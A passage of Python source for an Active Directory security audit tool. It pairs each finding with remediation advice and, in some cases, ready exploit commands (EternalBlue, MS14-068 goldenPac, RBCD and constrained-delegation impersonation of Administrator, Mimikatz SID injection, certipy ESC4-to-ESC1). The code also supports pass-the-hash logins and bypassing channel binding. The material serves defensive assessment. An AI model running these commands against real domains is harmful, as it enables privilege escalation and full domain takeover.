        "description": "Enabled accounts have DONT_EXPIRE_PASSWORD.",
        "why": "Captured hashes / passwords stay valid forever — primary post-breach persistence vector.",
        "remediation": [
            "Set-ADUser <user> -PasswordNeverExpires $false (or convert to gMSA for services).",
        ],
    },
    "S-DesEnabled": {
        "description": "Accounts have USE_DES_KEY_ONLY (DES-only Kerberos).",
        "why": "DES is broken — 56-bit keyspace, hours to crack with modern GPUs.",
        "remediation": [
            "Remove the flag; enforce AES on the account.",
        ],
    },
    "S-AesNotEnabled": {
        "description": "Service accounts have no AES encryption types in msDS-SupportedEncryptionTypes.",
        "why": "Kerberos falls back to RC4 — cheap to crack from kerberoast captures.",
        "remediation": [
            "Set-ADUser <svc> -KerberosEncryptionType AES128,AES256",
        ],
    },
    "S-SIDHistory": {
        "description": "Objects have sIDHistory entries.",
        "why": "Legitimate after migrations, but also a powerful backdoor (Golden / Diamond ticket persistence) — abuse if SID filtering is off.",
        "remediation": [
            "Clear sIDHistory after migrations complete: Set-ADUser <user> -Clear sIDHistory.",
        ],
    },
    "S-OS-XP": {
        "description": "Windows XP / Server 2003 systems are present in the domain.",
        "why": "Unpatched, lack SMB signing, vulnerable to MS17-010 et al. Foothold via single share.",
        "remediation": [
            "Decommission immediately or isolate on a strict VLAN.",
        ],
    },
    "S-OS-Vista": {
        "description": "Windows Vista / Server 2008 systems are present.",
        "why": "Out of mainstream support; lack many modern hardening features.",
        "remediation": ["Upgrade or decommission."],
    },
    "S-OS-NT": {
        "description": "NT4-era systems are present.",
        "why": "Predates any modern AD security feature.",
        "remediation": ["Remove from network."],
    },
    "S-SMB-v1": {
        "description": "SMBv1 is enabled on the domain controller.",
        "why": "WannaCry / EternalBlue / NotPetya transport. SMBv1 also lacks signing and integrity protections.",
        "remediation": [
            "Disable-WindowsOptionalFeature -Online -FeatureName smb1protocol",
            "Set-SmbServerConfiguration -EnableSMB1Protocol $false",
        ],
    },
    "S-FunctionalLevel1": {
        "description": "Domain or forest functional level ≤ 2003.",
        "why": "Missing AES, Kerberos armoring, Managed Service Accounts, fine-grained password policies.",
        "remediation": ["Raise functional level (verify no legacy DCs first)."],
    },
    "S-Vuln-MS14-068": {
        "description": "DC may be vulnerable to MS14-068 PAC forgery.",
        "why": "Any domain user forges a Kerberos ticket asserting DA membership.",
        "exploit": [
            "impacket-goldenPac DOMAIN/user:pass@<dc>",
        ],
        "remediation": [
            "Install KB3011780 on every DC; verify with WUSA.",
            "Upgrade past Windows Server 2008 R2.",
        ],
    },
    "S-Vuln-MS17_010": {
        "description": "Host appears vulnerable to MS17-010 (EternalBlue).",
        "why": "Pre-auth SYSTEM RCE over SMB. Used by WannaCry / NotPetya.",
        "exploit": [
            "nxc smb <host> -M ms17-010",
            "metasploit exploit/windows/smb/ms17_010_eternalblue",
        ],
        "remediation": [
            "Patch KB4012598 (and successors) on every host.",
            "Disable SMBv1.",
        ],
    },
    "S-KerberosArmoring": {
        "description": "Domain functional level below 2012 — Kerberos FAST/armoring is unavailable.",
        "why": "Without FAST, AS-REQ pre-auth is brute-forceable; Kerberos ticket privacy is reduced.",
        "remediation": [
            "Raise DFL to 2012+, then configure 'KDC support for claims, compound authentication and Kerberos armoring' = Always provide claims on DCs.",
        ],
    },
    "S-KerberosArmoringDC": {
        "description": "DC does not require Kerberos armoring (FAST).",
        "remediation": [
            "Set 'KDC support for claims, compound authentication and Kerberos armoring' policy to 'Fail unarmored authentication requests'.",
        ],
    },
    # ── Trust ───────────────────────────────────────────────────────────────
    "T-SIDFiltering": {
        "description": "SID filtering is not enabled on the trust.",
        "why": "Allows SID-history injection across the trust — common chain for cross-domain DA.",
        "exploit": [
            "Forge inter-realm TGT with sIDHistory containing target-domain DA SID; cross trust.",
        ],
        "remediation": [
            "netdom trust <local> /domain:<remote> /quarantine:yes",
        ],
    },
    "T-TGTDelegation": {
        "description": "TGT delegation is enabled on the trust.",
        "why": "An unconstrained host in the trusted domain receives our TGTs → cross-trust credential theft.",
        "remediation": [
            "Clear the TGT_DELEGATION_ENABLED bit (0x800) from trustAttributes.",
        ],
    },
    "T-SIDHistoryDangerous": {
        "description": "An object holds a sIDHistory entry referencing a SID from a trusted domain.",
        "why": "Persistent privilege escalation primitive across the trust boundary.",
        "remediation": ["Audit and clear sIDHistory after migrations complete."],
    },
    # ── v2 additions ──────────────────────────────────────────────────────────
    "P-RBCD": {
        "description": "Accounts have msDS-AllowedToActOnBehalfOfOtherIdentity set (resource-based constrained delegation).",
        "why": "If an attacker controls (or can create, via MachineAccountQuota) any principal listed in the RBCD descriptor, they can request S4U tickets to impersonate ANY user — including Domain Admins — to the configured host.",
        "technical": "msDS-AllowedToActOnBehalfOfOtherIdentity is an ntSecurityDescriptor naming the principals permitted to delegate to this object.",
        "exploit": [
            "rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action read 'DOMAIN/user:pass'",
            "getST.py -spn cifs/target -impersonate Administrator 'DOMAIN/EVIL$:pass'",
        ],
        "remediation": [
            "Review every RBCD entry; clear msDS-AllowedToActOnBehalfOfOtherIdentity where not required.",
            "Set ms-DS-MachineAccountQuota to 0 so low-priv users cannot add the attacker computer.",
        ],
        "refs": ["https://learn.microsoft.com/windows-server/security/kerberos/"],
    },
    "P-RBCD-Dangerous": {
        "description": "Resource-based constrained delegation is configured on a domain controller / Tier-0 object.",
        "why": "RBCD on a DC means whoever can write that descriptor — or already controls a listed principal — can impersonate any user to the DC. This is a direct path to full domain compromise.",
        "remediation": ["Immediately remove RBCD from DC objects; investigate how it was set (likely abuse)."],
    },
    "P-ConstrainedDelegService": {
        "description": "Service accounts are trusted for constrained delegation (msDS-AllowedToDelegateTo) to specific SPNs.",
        "why": "Compromising the service account lets an attacker use S4U2Proxy to access the target services as any user. With protocol transition (T2A4D / TRUSTED_TO_AUTH_FOR_DELEGATION) they can impersonate arbitrary users without their credentials.",
        "technical": "msDS-AllowedToDelegateTo lists target SPNs; userAccountControl TRUSTED_TO_AUTH_FOR_DELEGATION (0x1000000) enables protocol transition.",
        "exploit": [
            "getST.py -spn <target-spn> -impersonate Administrator 'DOMAIN/svc:pass'",
        ],
        "remediation": [
            "Minimise constrained-delegation grants; prefer RBCD scoped to specific resources.",
            "Add sensitive accounts to Protected Users and mark them 'account is sensitive and cannot be delegated'.",
        ],
    },
    "P-ComputerInPrivGroup": {
        "description": "Computer accounts are members of privileged groups (e.g. Domain Admins).",
        "why": "Anyone with SYSTEM on that machine — or its machine-account secret — inherits the group's domain privileges. Workstations are far easier to compromise than DCs, collapsing the tiering model.",
        "remediation": ["Remove computer accounts from privileged groups; grant the needed right to a dedicated service identity instead."],
    },
    "P-AdminCountOrphan": {
        "description": "Objects carry adminCount=1 but are not currently members of a protected group.",
        "why": "adminCount=1 leaves AdminSDHolder's restrictive ACL and broken inheritance on the object even after it is demoted. It signals former privilege and can hide ACL anomalies; attackers also look for these as high-value targets.",
        "technical": "AdminSDHolder stamps adminCount=1 and replaces the ACL hourly (SDProp). It is not cleared automatically when membership is removed.",
        "remediation": [
            "Verify the account is genuinely non-privileged, then set adminCount to <not set> and re-enable inheritance (dsacls /resetDefaultDACL or the AD object's 'Include inheritable permissions').",
        ],
    },
    "S-SIDHistoryPrivileged": {
        "description": "Accounts carry a privileged or built-in SID in their sIDHistory.",
        "why": "SID history is honoured at logon, so the account silently wields the privileges of the referenced SID (e.g. Enterprise Admins / Administrators) without appearing in any group. A classic stealth persistence backdoor.",
        "technical": "Look for sIDHistory RIDs 512/516/518/519/520 or built-in S-1-5-32-544 etc., or any RID 500.",
        "exploit": ["Mimikatz sid::patch + sid::add to inject; the account then authenticates with hidden admin rights."],
        "remediation": [
            "Clear the offending sIDHistory values (ntdsutil / Set-ADUser -Remove).",
            "Rotate the krbtgt password twice and review how the SID was injected.",
        ],
    },
    "A-RestrictRemoteSAM": {
        "description": "No GPO enforces 'Network access: Restrict clients allowed to make remote calls to SAM' (RestrictRemoteSAM).",
        "why": "Without it, low-privileged (sometimes unauthenticated) users can enumerate local group membership and accounts via SAMR — prime recon for lateral movement and local-admin mapping (SharpHound, net rpc).",
        "technical": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RestrictRemoteSAM (REG_SZ, SDDL). Should allow only Administrators (O:BAG:BAD:(A;;RC;;;BA)).",
        "remediation": ["Deploy the security option with an SDDL granting only Administrators remote SAM access."],
    },
    "A-NTLMAudit": {
        "description": "NTLM auditing is not enabled via GPO.",
        "why": "You cannot safely restrict or remove NTLM without first baselining where it is used. Absent auditing, relay and pass-the-hash activity also goes unlogged.",
        "technical": "Lsa\\MSV1_0\\AuditReceivingNTLMTraffic and RestrictSendingNTLMTraffic (set to audit=1/2 first).",
        "remediation": ["Enable 'Network security: Restrict NTLM: Audit ...' policies, review logs, then progressively restrict NTLM."],
    },
    "A-DSRMLogon": {
        "description": "DsrmAdminLogonBehavior=2 — the DSRM local administrator can log on over the network.",
        "why": "The DSRM account's password is rarely rotated and its NT hash can be dumped from the DC. With network logon enabled it becomes a stealth local-admin backdoor on the domain controller.",
        "technical": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior. 0/unset = console only.",
        "remediation": ["Set DsrmAdminLogonBehavior to 0; rotate the DSRM password regularly (e.g. Sync-AdamSyncFromAD / Set-ADAccountPassword on the DC in DSRM)."],
    },
    "A-CertTemplateESC4": {
        "description": "A published certificate template's ACL is writable by a low-privileged principal (ESC4).",
        "why": "Write access to a template lets an attacker reconfigure it into an ESC1 (enrollee-supplied SAN + authentication EKU, no approval) and then enroll a certificate for any user — typically a Domain Admin — and authenticate via PKINIT.",
        "technical": "Dangerous ACE (GenericAll/GenericWrite/WriteDacl/WriteOwner/WriteProperty) for Everyone/Authenticated Users/Domain Users/Computers on the pKICertificateTemplate object.",
        "exploit": [
            "certipy find -vulnerable -u user@domain -p pass",
            "certipy template -template <tmpl> -u user@domain -p pass   # weaponise to ESC1",
            "certipy req -template <tmpl> -upn administrator@domain ...  # then auth",
        ],
        "remediation": [
            "Restrict template ACLs to specific enrollment groups; remove write rights from broad principals.",
            "Enable manager approval on sensitive templates.",
        ],
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# Helper — deduplicate while preserving order
# ─────────────────────────────────────────────────────────────────────────────
def _dedup_keep_order(items):
    seen = set()
    out = []
    for x in items:
        k = x if isinstance(x, str) else str(x)
        if k in seen:
            continue
        seen.add(k)
        out.append(x)
    return out

# ─────────────────────────────────────────────────────────────────────────────
# HELPER UTILITIES
# ─────────────────────────────────────────────────────────────────────────────

def _krb_error_hint(ke) -> str:
    """Turn an impacket KerberosError into an operator-friendly diagnosis."""
    s = str(ke)
    low = s.lower()
    if "skew" in low or "clock" in low:
        return (f"{s}\n      -> Clock skew with the DC (>5 min). Sync time: "
                f"`sudo rdate -n <dc-ip>` or `sudo ntpdate <dc-ip>`.")
    if "principal_unknown" in low or "c_principal_unknown" in low:
        return (f"{s}\n      -> Username or realm is wrong. Check -u and that "
                f"-d is the AD DNS domain (e.g. corp.local).")
    if "preauth_failed" in low or "preauthentication" in low:
        return f"{s}\n      -> Bad password / NT hash / AES key."
    if "etype_nosupp" in low or "etype" in low:
        return (f"{s}\n      -> Encryption type unsupported. The account may be "
                f"AES-only; supply --aes-key instead of -p/-H.")
    if "client_revoked" in low or "revoked" in low:
        return f"{s}\n      -> Account is disabled or locked out."
    if "key_expired" in low or "expired" in low:
        return f"{s}\n      -> Password expired; reset it before assessing."
    if "wrong_realm" in low:
        return f"{s}\n      -> Wrong realm; -d must match the account's domain."
    return s


def filetime_to_dt(ft) -> Optional[datetime.datetime]:
    if ft is None:
        return None
    ft = int(ft)
    if ft in (FILETIME_NEVER, FILETIME_ZERO):
        return None
    try:
        ts = ft / 10_000_000 - 11_644_473_600
        return datetime.datetime.fromtimestamp(ts, tz=datetime.timezone.utc)
    except (ValueError, OSError):
        return None

def days_since(dt: Optional[datetime.datetime]) -> Optional[int]:
    if dt is None:
        return None
    return (datetime.datetime.now(tz=datetime.timezone.utc) - dt).days

def sid_to_str(raw) -> str:
    if raw is None:
        return ""
    if isinstance(raw, str):
        return raw
    try:
        if isinstance(raw, (bytes, bytearray)):
            b = raw
        else:
            b = bytes(raw)
        rev = b[0]
        sub_count = b[1]
        auth = int.from_bytes(b[2:8], 'big')
        subs = struct.unpack_from(f'<{sub_count}I', b, 8)
        return f"S-{rev}-{auth}-" + "-".join(str(s) for s in subs)
    except Exception:
        return str(raw)

def get_int(entry_attrs, attr: str, default=0) -> int:
    v = entry_attrs.get(attr)
    if v is None:
        return default
    if isinstance(v, list):
        v = v[0] if v else default
    try:
        return int(v)
    except (TypeError, ValueError):
        return default

def get_str(entry_attrs, attr: str, default="") -> str:
    v = entry_attrs.get(attr)
    if v is None:
        return default
    if isinstance(v, list):
        v = v[0] if v else default
    return str(v) if v is not None else default

def get_list(entry_attrs, attr: str) -> List[str]:
    v = entry_attrs.get(attr)
    if v is None:
        return []
    if isinstance(v, (list, tuple)):
        return [str(x) for x in v if x is not None]
    return [str(v)]

def dn_base(dn: str) -> str:
    """Return the first RDN value from a DN."""
    m = re.match(r'^[^=]+=([^,]+)', dn or "")
    return m.group(1) if m else dn

def check_port(host: str, port: int, timeout: float = 3.0) -> bool:
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def uac_has(uac_int: int, flag: int) -> bool:
    return bool(int(uac_int) & flag)

# ─────────────────────────────────────────────────────────────────────────────
# CLI ARGUMENT PARSER
# ─────────────────────────────────────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="scout",
        description=f"{TOOL_NAME} v{VERSION} — {TOOL_LONG}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -d corp.local -u john -p 'P@ssw0rd' --dc-ip 10.0.0.1
  %(prog)s -d corp.local -u john -H :31d6cfe0d16ae931b73c59d7e0c089c0 --dc-ip 10.0.0.1
  %(prog)s -d corp.local -k --dc-ip 10.0.0.1
  %(prog)s -d corp.local --null-session --dc-ip 10.0.0.1
  %(prog)s -d corp.local -u john -p 'P@ssw0rd' --dc-ip 10.0.0.1 --ldaps
  %(prog)s -d corp.local -u john -p 'P@ssw0rd' --dc-ip 10.0.0.1 --output /tmp/report.html
  %(prog)s -d corp.local --ccache /tmp/krb5cc_1000 --dc-ip 10.0.0.1
        """)

    auth = p.add_argument_group("Authentication")
    auth.add_argument("-u", "--username",  metavar="USER",   help="Username")
    auth.add_argument("-p", "--password",  metavar="PASS",   help="Password")
    auth.add_argument("-H", "--hashes",    metavar="LM:NT",  help="NTLM hashes (use :NThash for PTH / overpass-the-hash)")
    auth.add_argument("-d", "--domain",    metavar="DOMAIN", required=True, help="Target domain (FQDN, e.g. corp.local)")
    auth.add_argument("-k", "--kerberos",  action="store_true",
                      help="Use Kerberos: request a TGT from the supplied "
                           "password / -H hash / --aes-key (or reuse a ccache). "
                           "Best path when LDAP signing or channel binding is enforced.")
    auth.add_argument("--ccache",          metavar="FILE",
                      help="Reuse an existing Kerberos ccache (implies -k). "
                           "Also honoured via the KRB5CCNAME env var.")
    auth.add_argument("--save-ccache",     metavar="FILE", nargs="?", const="__AUTO__",
                      help="Save the obtained TGT to a ccache for reuse "
                           "(optional path; defaults to <user>.ccache).")
    auth.add_argument("--aes-key",         metavar="HEX",
                      help="AES 128/256 key for Kerberos (implies -k)")
    auth.add_argument("--no-pass",         action="store_true",
                      help="Do not prompt for password")
    auth.add_argument("--null-session",    action="store_true",
                      help="Attempt unauthenticated LDAP (anonymous bind)")
    auth.add_argument("--dc-ip",           metavar="IP",    required=True,
                      help="IP or hostname of domain controller (also used as the KDC)")
    auth.add_argument("--dc-host",         metavar="FQDN",
                      help="DC FQDN for the Kerberos SPN (auto-resolved if omitted)")

    conn = p.add_argument_group("Connection")
    conn.add_argument("--ldaps",     action="store_true", help="Use LDAPS (port 636)")
    conn.add_argument("--port",      type=int, default=0,
                      help="Override LDAP port (default 389 / 636 with --ldaps)")
    conn.add_argument("--gc",        action="store_true",
                      help="Use Global Catalog port (3268 or 3269)")
    conn.add_argument("--timeout",   type=int, default=20,
                      help="LDAP/network timeout in seconds (default 20)")
    conn.add_argument("--no-smb",    action="store_true",
                      help="Skip SMB-based checks (signature, SMBv1, null session)")
    conn.add_argument("--no-adcs",   action="store_true",
                      help="Skip ADCS certificate template checks")

    out = p.add_argument_group("Output")
    out.add_argument("-o", "--output", metavar="FILE",
                     help="HTML report output path (default: scout_<domain>_<ts>.html)")
    out.add_argument("--json",   metavar="FILE", nargs="?", const="__AUTO__",
                     help="Also write JSON findings (optional path; default scout_<domain>.json)")
    out.add_argument("--csv",    metavar="FILE", nargs="?", const="__AUTO__",
                     help="Also write a CSV of findings (optional path; default scout_<domain>.csv)")
    out.add_argument("--operator", metavar="NAME", default="",
                     help="Operator/author name printed on the report cover")
    out.add_argument("--scope",    metavar="TEXT", default="",
                     help="Engagement scope note printed on the report cover")
    out.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    out.add_argument("--no-color",      action="store_true", help="Disable colour output")
    return p

# ─────────────────────────────────────────────────────────────────────────────
# FINDING  (one rule trigger)
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class Finding:
    rule_id:  str
    title:    str
    category: str
    points:   int
    severity: str
    details:  str = ""
    affected: List[str] = field(default_factory=list)
    maturity: int = 3                       # CMMI 1 (worst) .. 5 (best)
    mitre:    List[str] = field(default_factory=list)  # ["T1003.006: DCSync", …]

    @property
    def sev_colour(self) -> str:
        return SEV_COLOUR.get(self.severity, "#95a5a6")

# ─────────────────────────────────────────────────────────────────────────────
# AD CONNECTION
# ─────────────────────────────────────────────────────────────────────────────

class ADConnection:
    def __init__(self, args):
        self.args      = args
        self.conn      = None
        self.server    = None
        self.base_dn   = ""
        self.cfg_nc    = ""
        self.sch_nc    = ""
        self._impacket = None  # set when impacket backend is active
        self.gc_root = ""

    def _ldap_port(self) -> int:
        if self.args.port:
            return self.args.port
        if self.args.gc:
            return 3269 if self.args.ldaps else 3268
        return 636 if self.args.ldaps else 389

    def _resolve_dc_hostname(self) -> str:
        """Return the DC's FQDN for Kerberos SPN construction.
        Order: explicit --dc-host, cached value, RootDSE dnsHostName,
        reverse DNS, then the IP as a last resort."""
        if getattr(self.args, "dc_host", None):
            return self.args.dc_host
        if getattr(self, "_dc_fqdn", None):
            return self._dc_fqdn
        # RootDSE is the most reliable: it returns the DC's real dnsHostName
        # even when reverse DNS / PTR records are absent.
        try:
            probe = Server(self.args.dc_ip, port=self._ldap_port() if not self.args.ldaps else 389,
                           use_ssl=False, get_info=ALL, connect_timeout=self.args.timeout)
            conn = Connection(probe)
            if conn.open() is not False and probe.info:
                dh = probe.info.other.get("dnsHostName")
                if dh:
                    self._dc_fqdn = dh[0] if isinstance(dh, list) else dh
                    try: conn.unbind()
                    except Exception: pass
                    return self._dc_fqdn
            try: conn.unbind()
            except Exception: pass
        except Exception:
            pass
        try:
            self._dc_fqdn = socket.gethostbyaddr(self.args.dc_ip)[0]
            return self._dc_fqdn
        except (socket.herror, socket.gaierror, OSError):
            pass
        return self.args.dc_ip

    def _build_server(self) -> Server:
        port = self._ldap_port()
        # version=None lets ldap3 use create_default_context() then explicitly
        # disables cert/hostname validation — avoids PROTOCOL_TLS_CLIENT's
        # strict defaults that cause connection resets against self-signed DCs.
        tls = ldap3.Tls(validate=ssl.CERT_NONE) if self.args.ldaps else None
        return Server(self.args.dc_ip, port=port, use_ssl=self.args.ldaps,
                      tls=tls, get_info=ALL, connect_timeout=self.args.timeout)

    def connect(self) -> bool:
        """Establish an authenticated LDAP session, choosing the most robust
        transport for the DC's hardening posture.

        Strategy
        --------
        * Kerberos requested (-k / --ccache / --aes-key)  -> impacket Kerberos.
          SCOUT requests a TGT itself from the supplied password, NT hash
          (overpass-the-hash) or AES key, then binds with GSS-SPNEGO. This
          satisfies "LDAP server signing required" and, over plain 389,
          sidesteps LDAPS channel-binding (EPA) entirely.
        * Otherwise -> fast ldap3 NTLM/SIMPLE path. If the DC answers
          strongerAuthRequired (signing/channel-binding enforced) we transparently
          upgrade to Kerberos when usable credentials are available.
        """
        # Explicit Kerberos path -------------------------------------------------
        if self.args.kerberos or self.args.ccache or self.args.aes_key:
            return self._connect_kerberos()

        self.server = self._build_server()
        bind_err = None
        try:
            self._do_bind()
        except Exception as e:
            bind_err = e
        # ldap3 sometimes reports strongerAuthRequired as bound==False + result
        # code 8 WITHOUT raising — detect both shapes.
        if bind_err is None and self.conn is not None and not self.conn.bound:
            res = self.conn.result or {}
            if res.get("result") == 8 or "strongerauth" in str(res).lower():
                bind_err = RuntimeError(f"strongerAuthRequired: {res.get('description','')}")
        if bind_err is not None:
            e = bind_err
            msg = str(e).lower()
            stronger = ("strongerauth" in msg or "00002028" in msg
                        or "confidentiality" in msg or "integrity" in msg
                        or "data 80090346" in msg)
            if stronger:
                print("[*] DC enforces LDAP signing / channel binding for this bind.")
                if self.args.username and (self.args.password is not None
                                           or self.args.hashes):
                    print("[*] Upgrading to Kerberos (requesting a TGT) — the "
                          "sealed GSS bind satisfies signing and bypasses EPA.")
                    self.args.kerberos = True
                    return self._connect_kerberos()
                if not self.args.ldaps:
                    print("[*] Retrying over LDAPS (636)…")
                    self.args.ldaps = True
                    self.server = self._build_server()
                    try:
                        self._do_bind()
                    except Exception as e2:
                        print(f"[-] LDAPS bind failed: {e2}")
                        return False
                else:
                    print("[-] Cannot satisfy the DC's bind requirements. "
                          "Supply credentials and use -k for Kerberos.")
                    return False
            else:
                print(f"[-] Connection error: {e}")
                return False

        if not self.conn or not self.conn.bound:
            print(f"[-] LDAP bind failed: {self.conn.result if self.conn else ''}")
            return False

        self._extract_root_info()
        return True

    def _do_bind(self) -> None:
        if self.args.null_session:
            self.conn = Connection(self.server, auto_bind=True)
        elif self.args.hashes:
            lm, nt = self._parse_hashes()
            user = f"{self.args.domain}\\{self.args.username}"
            self.conn = Connection(self.server, user=user, password=f"{lm}:{nt}",
                                   authentication=NTLM, auto_bind=True)
        elif self.args.username and self.args.password is not None:
            user = f"{self.args.domain}\\{self.args.username}"
            self.conn = Connection(self.server, user=user, password=self.args.password,
                                   authentication=NTLM, auto_bind=True)
        else:
            raise ValueError("No credentials supplied and --null-session not set.")

    # ── Kerberos / impacket backend ───────────────────────────────────────────
    # Used whenever Kerberos is requested or when the DC enforces LDAP signing /
    # channel binding. impacket binds with a GSS-SPNEGO Kerberos AP-REQ which the
    # DC accepts as a "signed" SASL bind; over plain 389 there is no TLS channel,
    # so LDAPS channel-binding (EPA, KB5021130) does not apply.

    def _obtain_tgt(self, dc_fqdn: str):
        """Request a Kerberos TGT from the supplied secret and return it as the
        in-memory dict impacket's kerberosLogin() consumes.

        Returns None when an existing ccache should be used instead (the bind
        will then load credentials from KRB5CCNAME).
        """
        # Reuse an existing ticket cache if the operator pointed us at one.
        if self.args.ccache:
            if not os.path.exists(self.args.ccache):
                raise FileNotFoundError(f"ccache file not found: {self.args.ccache}")
            os.environ["KRB5CCNAME"] = os.path.abspath(self.args.ccache)
            print(f"[*] Using existing ccache: {self.args.ccache}")
            return None
        # No secret to forge a TGT with -> fall back to KRB5CCNAME (if any).
        have_secret = (self.args.password is not None or self.args.hashes
                       or self.args.aes_key)
        if not have_secret:
            if os.environ.get("KRB5CCNAME"):
                print(f"[*] Using ccache from KRB5CCNAME: {os.environ['KRB5CCNAME']}")
                return None
            raise ValueError("Kerberos requested but no password/-H/--aes-key "
                             "and no ccache (set --ccache or KRB5CCNAME).")

        from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
        from impacket.krb5.types import Principal
        from impacket.krb5 import constants as _kconst
        from impacket.krb5.ccache import CCache

        if not self.args.username:
            raise ValueError("Kerberos auth requires a username (-u).")

        lm = nt = ""
        if self.args.hashes:
            lm, nt = self._parse_hashes()
        realm = self.args.domain.upper()
        principal = Principal(self.args.username,
                              type=_kconst.PrincipalNameType.NT_PRINCIPAL.value)
        how = ("AES key" if self.args.aes_key
               else ("NT hash (overpass-the-hash)" if self.args.hashes else "password"))
        print(f"[*] Requesting TGT for {self.args.username}@{realm} via {how} "
              f"(KDC {self.args.dc_ip})…")
        try:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                principal, self.args.password or "", realm,
                unhexlify(lm) if lm else b"", unhexlify(nt) if nt else b"",
                self.args.aes_key or "", self.args.dc_ip)
        except KerberosError as ke:
            raise RuntimeError(_krb_error_hint(ke))
        print("[+] TGT acquired.")

        # Persist the TGT to a ccache and export KRB5CCNAME so the later SMB /
        # SYSVOL Kerberos logins transparently reuse this ticket. If the operator
        # asked to keep it (--save-ccache) we honour their path; otherwise a temp
        # file is used and cleaned up at exit.
        cc = CCache()
        cc.fromTGT(tgt, oldSessionKey, sessionKey)
        if self.args.save_ccache:
            path = (self.args.save_ccache if self.args.save_ccache != "__AUTO__"
                    else f"{self.args.username}.ccache")
            cc.saveFile(path)
            print(f"[+] Saved ccache: {path}  (export KRB5CCNAME={os.path.abspath(path)})")
        else:
            fd, path = tempfile.mkstemp(suffix=".ccache", prefix="scout_")
            os.close(fd)
            cc.saveFile(path)
            import atexit
            atexit.register(lambda p=path: os.path.exists(p) and os.remove(p))
        os.environ["KRB5CCNAME"] = os.path.abspath(path)

        return {"KDC_REP": tgt, "cipher": cipher, "sessionKey": sessionKey}

    def _connect_kerberos(self) -> bool:
        try:
            from impacket.ldap import ldap as ildap
            from impacket.ldap.ldapasn1 import Scope as LDAPScope
        except ImportError:
            print("[-] impacket not available: pip install impacket")
            return False

        dc_fqdn = self._resolve_dc_hostname()
        if dc_fqdn == self.args.dc_ip:
            print("[!] Could not resolve the DC FQDN — Kerberos needs the SPN "
                  "ldap/<fqdn>. Pass --dc-host <fqdn> if the bind fails.")
        try:
            tgt = self._obtain_tgt(dc_fqdn)
        except Exception as e:
            print(f"[-] Kerberos pre-auth failed: {e}")
            return False

        lm = nt = ""
        if self.args.hashes:
            lm, nt = self._parse_hashes()
        scheme = "ldaps" if self.args.ldaps else "ldap"
        url = f"{scheme}://{dc_fqdn}"
        try:
            ic = ildap.LDAPConnection(url, "", self.args.dc_ip)
        except Exception as e:
            print(f"[-] impacket connect failed ({url}): {e}")
            return False

        try:
            ic.kerberosLogin(self.args.username or "", "", self.args.domain,
                             lmhash=lm, nthash=nt, aesKey=self.args.aes_key or "",
                             kdcHost=self.args.dc_ip, TGT=tgt,
                             useCache=(tgt is None))
        except Exception as e:
            print(f"[-] Kerberos LDAP bind failed: {e}")
            if self.args.ldaps:
                print("[!] LDAPS + Kerberos can fail under channel-binding "
                      "enforcement and impacket's TLS1.0 stack. Retry WITHOUT "
                      "--ldaps (Kerberos over 389 bypasses EPA).")
            return False
        print(f"[+] Kerberos LDAP bind successful ({url}).")

        self._impacket = ic
        # pull naming contexts from RootDSE
        try:
            resp = ic.search(searchBase="", searchFilter="(objectClass=*)",
                             scope=LDAPScope("baseObject"),
                             attributes=["defaultNamingContext",
                                         "configurationNamingContext",
                                         "schemaNamingContext",
                                         "rootDomainNamingContext"])
            for entry in resp:
                # impacket can return SearchResultReference/Done entries with no
                # 'attributes' — guard per-entry so they don't abort the loop.
                try:
                    attrs_ = entry["attributes"]
                except Exception:
                    continue
                for attr in attrs_:
                    n = str(attr["type"]); v = str(attr["vals"][0]) if attr["vals"] else ""
                    if   n == "defaultNamingContext":       self.base_dn = v
                    elif n == "configurationNamingContext": self.cfg_nc  = v
                    elif n == "schemaNamingContext":        self.sch_nc  = v
                    elif n == "rootDomainNamingContext":    self.gc_root = v
        except Exception:
            pass
        if not self.base_dn:
            self.base_dn = ",".join(f"DC={p}" for p in self.args.domain.split("."))
        return True

    def _impacket_search(self, base: str, flt: str, attrs: List[str],
                         page_size: int = 500) -> List[Dict]:
        from impacket.ldap.ldapasn1 import SimplePagedResultsControl
        from impacket.ldap.ldap import LDAPSearchError
        ctrl = SimplePagedResultsControl(size=page_size)
        try:
            raw = self._impacket.search(searchBase=base, searchFilter=flt,
                                        attributes=attrs, searchControls=[ctrl])
        except LDAPSearchError as e:
            raw = e.getAnswers()
        except Exception as e:
            if self.args.verbose:
                print(f"[!] impacket search error: {e}")
            return []
        out = []
        for entry in raw:
            try:
                dn = str(entry["objectName"])
                ad = {}
                for a in entry["attributes"]:
                    ad[str(a["type"])] = [bytes(v) for v in a["vals"]]
                out.append({"dn": dn, "attrs": ad})
            except Exception:
                continue
        return out

    def _parse_hashes(self) -> Tuple[str, str]:
        h = self.args.hashes
        if ":" in h:
            lm, nt = h.split(":", 1)
        else:
            lm, nt = "aad3b435b51404eeaad3b435b51404ee", h
        if not lm or lm == "":
            lm = "aad3b435b51404eeaad3b435b51404ee"
        # Pad to 32 hex chars if needed
        lm = lm.ljust(32, "0")[:32]
        nt = nt.ljust(32, "0")[:32]
        return lm, nt

    def _extract_root_info(self):
        info = self.server.info
        if info:
            dns = info.other.get("defaultNamingContext", [""])
            self.base_dn = dns[0] if isinstance(dns, list) else dns
            cfg = info.other.get("configurationNamingContext", [""])
            self.cfg_nc  = cfg[0] if isinstance(cfg, list) else cfg
            sch = info.other.get("schemaNamingContext", [""])
            self.sch_nc  = sch[0] if isinstance(sch, list) else sch
            gc  = info.other.get("rootDomainNamingContext", [""])
            self.gc_root = gc[0] if isinstance(gc, list) else gc

    def paged_search(self, base: str, flt: str, attrs: List[str],
                     scope=ldap3.SUBTREE, page_size: int = 500) -> List[Dict]:
        if getattr(self, "_impacket", None):
            return self._impacket_search(base, flt, attrs, page_size)
        results = []
        try:
            gen = self.conn.extend.standard.paged_search(
                search_base=base,
